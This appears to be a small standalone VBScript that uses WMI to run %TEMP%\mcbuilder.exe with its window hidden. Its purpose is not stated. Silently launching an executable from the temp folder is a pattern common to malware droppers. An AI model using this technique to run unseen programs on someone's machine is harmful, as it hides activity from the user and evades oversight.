Function CreateProcess(cmd)
  Dim sobjWMIService, objStartup, objConfig, objProcess
  Set sobjWMIService = GetObject("winmgmts:\\.\root\cimv2")
  Set objStartup = sobjWMIService.Get("Win32_ProcessStartup")
  Set objConfig = objStartup.SpawnInstance_
  objConfig.ShowWindow = 0
  Set objProcess = sobjWMIService.Get("Win32_Process")
  objProcess.Create cmd, Null, objConfig, Null
End Function

Function getEnv(path)
       On Error Resume Next
       Dim osh: Set osh = CreateObject("WScript.Shell")
       getEnv = osh.ExpandEnvironmentStrings(path)
       Set osh = Nothing
End Function

Dim target_dir
target_dir = getEnv("%TEMP%")

Dim execcmd
execcmd = target_dir & "\mcbuilder.exe"

CreateProcess(execcmd)
